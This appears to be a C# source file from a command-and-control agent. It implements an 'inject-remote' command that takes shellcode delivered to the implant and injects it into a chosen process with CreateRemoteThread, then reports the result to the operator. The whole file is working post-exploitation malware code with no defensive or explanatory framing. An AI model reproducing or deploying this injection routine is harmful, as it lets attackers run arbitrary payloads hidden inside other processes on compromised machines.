using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class RemoteInjectCommand : AgentCommand
    {
        public override string Name => "inject-remote";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            this.CheckFileDownloaded(task, context);

            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var shellcode = file.GetFileContent();

            int processId = int.Parse(task.SplittedArgs[0]);

            var process = Process.GetProcessById(processId);
            if (process == null)
            {
                context.Result.Result = $"Unable to find process with Id {processId}";
                return;
            }

            var winAPI = WinAPIWrapper.CreateInstance();

            try
            {
                winAPI.Inject(process.Handle, IntPtr.Zero, shellcode, InjectionMethod.CreateRemoteThread);
                context.AppendResult($"Injection succeed!");
            }
            catch(Exception ex)
            {
                context.Error($"Injection failed : {ex}");
                return;
            }
        }
    }
}
